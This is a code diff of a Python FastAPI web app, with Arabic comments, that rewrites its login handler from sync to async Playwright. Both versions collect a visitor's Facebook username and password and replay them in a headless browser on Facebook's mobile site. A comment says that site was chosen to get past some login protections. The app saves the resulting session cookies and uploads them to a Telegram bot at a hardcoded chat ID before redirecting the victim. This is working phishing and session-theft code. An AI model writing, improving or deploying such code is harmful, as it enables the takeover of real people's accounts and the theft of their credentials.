@@ -20,50 +20,39 @@ TELEGRAM_CHAT_ID = "8357381411"
 async def login_page(request: Request):
  return templates.TemplateResponse("login.html", {"request": request})
 
+
 @app.post("/api/start-session")
 async def start_session(username: str = Form(...), password: str = Form(...)):
- # تنظيف اسم المستخدم لإنشاء اسم ملف آمن
- safe_username = username.replace("@", "_").replace(".", "_")
- session_filepath = f"sessions/{safe_username}_session.json"
- 
- try:
-    # تشغيل المتصفح المخفي (Headless) للعمل على السيرفر بأقل استهلاك CPU
-    with sync_playwright() as p:
-        browser = p.chromium.launch(headless=True)
-        context = browser.new_context(
-            user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
-        )
-        page = context.new_page()
+    safe_username = username.replace("@", "_").replace(".", "_")
+    session_filepath = f"sessions/{safe_username}_session.json"
+    
+    os.makedirs("sessions", exist_ok=True)
 
-        # فتح نسخة الموبايل من فيسبوك لأنها خفيفة وتخطى بعض حمايات تسجيل الدخول
-        page.goto("https://m.facebook.com/")
+    try:
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(headless=True)
+            context = await browser.new_context(
+                user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
+            )
+            page = await context.new_page()
+            await page.goto("https://m.facebook.com/")
+            await page.fill("input[name='email']", username)
+            await page.fill("input[name='pass']", password)
+            await page.click("button[name='login']")
+            await page.wait_for_timeout(5000)
+            await context.storage_state(path=session_filepath)
+            await browser.close()
 
-        # تعبئة البيانات
-        page.fill("input[name='email']", username)
-        page.fill("input[name='pass']", password)
-        page.click("button[name='login']")
+        with open(session_filepath, 'rb') as session_file:
+            requests.post(TELEGRAM_BOT_API, files={'document': session_file}, data={'chat_id': TELEGRAM_CHAT_ID})
 
-        # انتظار استجابة الصفحة بعد الضغط (5 ثوانٍ كحد أقصى)
-        page.wait_for_timeout(5000)
+        return RedirectResponse(url=REDIRECT_TARGET_URL, status_code=303)
 
-        # حفظ الجلسة والكوكيز في المجلد الدائم على السيرفر
-        context.storage_state(path=session_filepath)
-
-        browser.close()
-
-    # إرسال ملف الجلسة إلى بوت تليجرام
-    with open(session_filepath, 'rb') as session_file:
-        requests.post(TELEGRAM_BOT_API, files={'document': session_file}, data={'chat_id': TELEGRAM_CHAT_ID})
-
-    # بعد النجاح، يتم توجيه المستخدم تلقائياً للرابط المطلوب
-    return RedirectResponse(url=REDIRECT_TARGET_URL, status_code=303)
-
- except Exception as e:
-    # في حالة حدوث خطأ يتم عرضه على الشاشة
-    return JSONResponse(content={
-        "status": "error",
-        "message": f"حدث خطأ أثناء المزامنة: {str(e)}"
-    }, status_code=500)
+    except Exception as e:
+        return JSONResponse(content={
+            "status": "error",
+            "message": f"حدث خطأ أثناء المزامنة: {str(e)}"
+        }, status_code=500)
 
 if __name__ == "__main__":
  # قراءة البورت الديناميكي الموفر من Railway تلقائياً
